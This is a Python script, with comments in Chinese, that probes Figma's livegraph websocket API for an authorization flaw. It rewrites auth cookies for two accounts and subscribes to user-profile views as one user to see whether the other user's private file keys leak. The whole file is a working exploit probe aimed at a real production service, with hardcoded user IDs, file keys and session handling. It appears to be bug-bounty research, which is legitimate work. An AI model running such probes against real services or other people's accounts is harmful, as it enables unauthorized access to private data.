# -*- coding: utf-8 -*-
"""对照判定: UserProfilePageView 是否越权暴露私有文件
攻击假设: paginatedRecentFiles 返回任意用户 recent files (file key), 若 resolver 不区分公开/私有
  -> B 查 A_UID 能看到 A 的私有文件 (A_MAKE 等) = 越权
基线: A 身份查自己(应含私有文件) vs B 身份查 A(若相同=越权, 若仅公开=正常)
"""
import sys, json, io, asyncio, time, urllib.parse, uuid
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)

OUT = io.open("_ws_profile_probe_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, uid, ck, wait=9):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": ck,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


def extract_files(frames):
    """从帧里提取 file key / name 出现的位置"""
    txt = " ".join(frames)
    keys = set()
    import re
    for m in re.finditer(r'"key":"([A-Za-z0-9]{16,})"', txt):
        keys.add(m.group(1))
    return keys, txt


async def run_case(label, view, args, uid, ck, fk=A_MAKE):
    frames = await sub(view, args, fk, uid, ck, wait=8)
    txt = " ".join(frames)
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    keys, _ = extract_files(frames)
    if has_data:
        tag = f"⭐返回数据 keys={keys if keys else '(无key)'}"
    elif any("error" in f.lower() for f in frames):
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag}")
    OUT.write(f"\n===== [{label}] {view} {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:3000]}\n")
        if has_data:
            print(f"  🖼 {f[:1000]}")


async def main():
    print("=== UserProfilePageView (action=edited) ===")
    await run_case("基线A→自己", "UserProfilePageView",
                   {"action": "edited", "userId": A_UID, "firstPageSize": 25,
                    "sortOrder": "DESC", "__requestId": str(uuid.uuid4())}, A_UID, ABS_A)
    await asyncio.sleep(0.4)
    await run_case("攻击B→A", "UserProfilePageView",
                   {"action": "edited", "userId": A_UID, "firstPageSize": 25,
                    "sortOrder": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.4)
    await run_case("基线B→自己", "UserProfilePageView",
                   {"action": "edited", "userId": B_UID, "firstPageSize": 25,
                    "sortOrder": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.4)
    await run_case("空壳对照 不存在uid", "UserProfilePageView",
                   {"action": "edited", "userId": "999999999999", "firstPageSize": 25,
                    "sortOrder": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.4)

    print("\n=== UserProfilePageByEditorTypeView (B→A) ===")
    for et in ["0", "1", "2"]:
        await run_case(f"B→A et={et}", "UserProfilePageByEditorTypeView",
                       {"_editorTypeRaw": et, "action": "edited", "userId": A_UID,
                        "firstPageSize": 25, "sortOrder": "DESC",
                        "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.3)

    OUT.close()
    print("\nDONE")


asyncio.run(main())
